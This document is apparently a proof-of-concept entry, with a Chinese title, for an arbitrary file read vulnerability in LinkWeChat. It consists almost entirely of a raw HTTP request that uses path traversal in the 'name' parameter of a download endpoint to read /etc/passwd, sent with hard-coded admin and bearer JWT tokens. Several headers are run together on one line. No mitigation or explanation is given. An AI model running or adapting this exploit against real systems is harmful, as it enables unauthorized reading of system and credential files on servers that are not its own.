## LinkWeChat任意文件读取漏洞

## poc
```
GET /linkwechat-api/common/download/resource?name=/profile/../../../../../etc/passwd HTTP/1.1
Host: ip:port
Cookie: Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9naW5fdHlwZSI6IkxpbmtXZUNoYXRBUEkiLCJ1c2VyX25hbWUiOiJsdyIsInVzZXJfa2V5IjoiMGFmOWI2NGItZjMxMi00ZTQ1LTgzZTgtZjE4ODAzODkyNWQyIiwiY29ycF9uYW1lIjoi5Luf5b6u56eR5oqAIiwiY29ycF9pZCI6Ind3NjIyZmM4NTJmNzljM2YxMyJ9.XqbboaMctCUvviPeEwcMv7a2E3D288Prm9hQ2r8dizdadRaV4R-ldDXlYoHiitL-YfDq9V43CQ6TpMsc1MbH9QSec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"Accept: application/json, text/plain, */*Sec-Ch-Ua-Mobile: ?0Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyX3R5cGUiOiIwMyIsInVzZXJfaWQiOjE2OCwibG9naW5fdHlwZSI6IkxpbmtXZUNoYXRBUEkiLCJ1c2VyX25hbWUiOiJsdyIsInVzZXJfa2V5IjoiMGFmOWI2NGItZjMxMi00ZTQ1LTgzZTgtZjE4ODAzODkyNWQyIiwiY29ycF9uYW1lIjoi5Luf5b6u56eR5oqAIiwiY29ycF9pZCI6Ind3NjIyZmM4NTJmNzljM2YxMyJ9.XqbboaMctCUvviPeEwcMv7a2E3D288Prm9hQ2r8dizdadRaV4R-ldDXlYoHiitL-YfDq9V43CQ6TpMsc1MbH9Q
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://127.0.0.1/login?redirect=/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
X-Forwarded-For: 127.0.0.1
Connection: close
```

![image](https://github.com/wy876/POC/assets/139549762/5607d664-803e-487c-9f25-7e303938b220)
